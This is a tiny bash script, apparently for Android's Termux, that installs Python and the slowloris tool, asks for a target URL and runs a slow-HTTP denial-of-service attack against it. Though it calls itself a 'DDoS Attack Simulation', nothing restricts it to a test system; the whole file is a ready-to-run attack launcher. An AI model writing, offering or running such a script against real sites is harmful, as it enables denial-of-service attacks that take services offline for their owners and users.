#!/bin/bash
echo "🔥 Running DDoS Attack Simulation..."
pkg install python -y
pip install slowloris
read -p "Enter Target URL: " target
slowloris $target
